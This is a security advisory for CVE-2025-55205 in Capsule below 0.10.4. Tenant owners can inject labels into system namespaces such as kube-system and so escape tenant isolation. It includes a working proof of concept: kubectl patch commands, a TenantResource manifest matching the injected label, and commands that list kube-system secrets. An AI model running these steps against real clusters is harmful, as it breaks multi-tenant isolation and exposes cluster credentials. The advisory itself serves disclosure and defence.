# Capsule tenant owners with "patch namespace" permission can hijack system namespaces label

**GHSA**: GHSA-fcpm-6mxq-m5vv | **CVE**: CVE-2025-55205 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-863

**Affected Packages**:
- **github.com/projectcapsule/capsule** (go): < 0.10.4

## Description

### Summary
A namespace label injection vulnerability in Capsule v0.10.3 allows authenticated tenant users to inject arbitrary labels into system namespaces (kube-system, default, capsule-system), bypassing multi-tenant isolation and potentially accessing cross-tenant resources through TenantResource selectors. This vulnerability enables privilege escalation and violates the fundamental security boundaries that Capsule is designed to enforce.

### Details
The vulnerability exists in the namespace validation webhook logic located in `pkg/webhook/namespace/validation/patch.go:60-77`. The critical flaw is in the conditional check that only validates tenant ownership when a namespace already has a tenant label:

```go
if label, ok := ns.Labels[ln]; ok {
    // Only checks permissions when namespace has tenant label
    if !utils.IsTenantOwner(tnt.Spec.Owners, req.UserInfo) {
        response := admission.Denied(e)
        return &response
    }
}

return nil  // Critical issue: allows operation if no tenant label exists
```

**Root Cause Analysis:**
1. **Missing Default Protection**: System namespaces (kube-system, default, capsule-system) do not have the `capsule.clastix.io/tenant` label by default
2. **Bypass Logic**: The webhook only enforces tenant ownership validation when the target namespace already belongs to a tenant
3. **Unrestricted Label Injection**: Authenticated users can inject arbitrary labels into unprotected namespaces

**Attack Vector Path:**
```
Label Injection (user-controlled) → Namespace Selector (system matching) → TenantResource/Quota Check (authorization bypass) → Cross-tenant Resource Access
```

This mirrors the CVE-2024-39690 attack pattern but uses label injection instead of ownerReference manipulation:
- **CVE-2024-39690**: `ownerReference(user-controlled) → tenant.Status.Namespaces(system state) → quota/permission check(auth policy) → namespace hijacking`
- **This vulnerability**: `Label injection(user-controlled) → Namespace selector(system matching) → TenantResource/Quota check(auth policy) → cross-tenant resource access`

### PoC
**Prerequisites:**
- Minikube cluster with Capsule v0.10.3 installed
- Authenticated tenant user with basic RBAC permissions

**Step 1: Environment Setup**
```bash
# Install Minikube and Capsule
minikube start
helm repo add projectcapsule https://projectcapsule.github.io/charts
helm install capsule projectcapsule/capsule -n capsule-system --create-namespace

# Create tenant and user
kubectl create -f - << EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
  name: tenant1
spec:
  owners:
  - name: alice
    kind: User
EOF

# Create user certificate and kubeconfig (using provided script)
./create-user-minikube.sh alice tenant1
```

**Step 2: Label Injection Attack**
```bash
# Switch to attacker context
export KUBECONFIG=alice-tenant1.kubeconfig

# Inject malicious labels into system namespaces
kubectl patch namespace kube-system --type='json' -p='[
  {
    "op": "add",
    "path": "/metadata/labels/malicious-label",
    "value": "attack-value"
  }
]'

# Verify injection success
kubectl get namespace kube-system --show-labels
```

**Step 3: Exploitation via TenantResource**
```bash
# Create attacker-controlled namespace
kubectl create namespace alice-attack

# Create malicious TenantResource targeting injected labels
cat <<EOF | kubectl apply -f -
apiVersion: capsule.clastix.io/v1beta2
kind: TenantResource
metadata:
  name: malicious-resource
  namespace: alice-attack
spec:
  resyncPeriod: 60s
  resources:
  - namespaceSelector:
      matchLabels:
        malicious-label: "attack-value"
EOF

# Verify cross-tenant access
kubectl get tenantresource -n alice-attack malicious-resource -o yaml
```

**Step 4: Verification of Impact**
```bash
# Check if system namespace resources are now accessible
export KUBECONFIG=~/.kube/config
kubectl get namespaces -l "malicious-label=attack-value"
# Output shows: kube-system (and potentially other injected namespaces)

# Check for potential resource replication/access
kubectl get all -n kube-system
kubectl get secrets -n kube-system
kubectl get configmaps -n kube-system
```

**Automated Testing Script:**
A complete vulnerability verification script is available that tests:
- Label injection into multiple system namespaces
- TenantResource exploitation
- Cross-tenant resource access verification
- Impact assessment and cleanup

### Impact
**Vulnerability Type:** Authorization Bypass / Privilege Escalation

**Who is Impacted:**
- **Multi-tenant Kubernetes clusters** using Capsule v0.10.3 and potentially earlier versions
- **Organizations relying on Capsule** for tenant isolation and resource governance
- **Cloud service providers** offering Kubernetes-as-a-Service with Capsule-based multi-tenancy

**Security Impact:**
1. **Multi-tenant Isolation Bypass**: Attackers can access resources from other tenants or system namespaces
2. **Privilege Escalation**: Tenant users can gain access to cluster-wide resources and sensitive system components
3. **Data Exfiltration**: Potential access to secrets, configmaps, and other sensitive data in system namespaces
4. **Resource Quota Bypass**: Ability to consume resources outside assigned tenant boundaries
5. **Policy Circumvention**: Bypass network policies, security policies, and other tenant-level restrictions

**Real-world Exploitation Scenarios:**
- Access to kube-system secrets containing cluster certificates and service account tokens
- Modification or replication of critical system configurations
- Cross-tenant data access in shared clusters
- Potential cluster-wide compromise through system namespace access

**Severity:** High - This vulnerability fundamentally breaks the multi-tenant security model that Capsule is designed to provide, allowing authenticated users to escape their tenant boundaries and access system-level resources.
